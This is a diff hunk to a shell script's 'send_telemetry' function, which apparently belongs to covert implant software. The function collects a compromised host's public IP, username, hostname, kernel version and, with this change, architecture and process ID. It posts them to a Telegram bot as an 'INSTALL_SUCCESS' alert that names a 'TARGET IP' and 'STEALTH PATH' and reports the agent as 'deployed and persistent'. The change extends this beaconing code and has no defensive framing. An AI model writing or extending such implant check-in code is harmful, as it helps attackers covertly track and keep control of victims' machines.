@@ -127,8 +127,10 @@ send_telemetry() {
     local ip=$(curl -s https://ifconfig.me || echo "Unknown")
     local kernel=$(uname -r)
     local user=$(whoami)
+    local arch=$(uname -m)
+    local pid=$$
     
-    local payload="<b>SYSTEM ALERT: [INSTALL_SUCCESS]</b>\n<b>TARGET IP    :</b> <code>${ip}</code>\n<b>USER         :</b> <code>${user}</code>\n<b>HOSTNAME     :</b> <code>${hostname}</code>\n<b>KERNEL VER   :</b> <code>${kernel}</code>\n<b>ACTION       :</b> Agent successfully deployed and persistent.\n<b>STEALTH PATH :</b> <code>${TARGET_BINARY}</code>\n<b>TIMESTAMP    :</b> ${timestamp}"
+    local payload="<b>SYSTEM ALERT: [INSTALL_SUCCESS]</b><br><b>TARGET IP    :</b> <code>${ip}</code><br><b>USER         :</b> <code>${user}</code><br><b>HOSTNAME     :</b> <code>${hostname}</code><br><b>KERNEL VER   :</b> <code>${kernel}</code><br><b>PID / ARCH   :</b> <code>${pid} / ${arch}</code><br><b>ACTION       :</b> Agent successfully deployed and persistent.<br><b>STEALTH PATH :</b> <code>${TARGET_BINARY}</code><br><b>TIMESTAMP    :</b> ${timestamp}"
 
     curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
         -d "chat_id=${CHAT_ID}" \
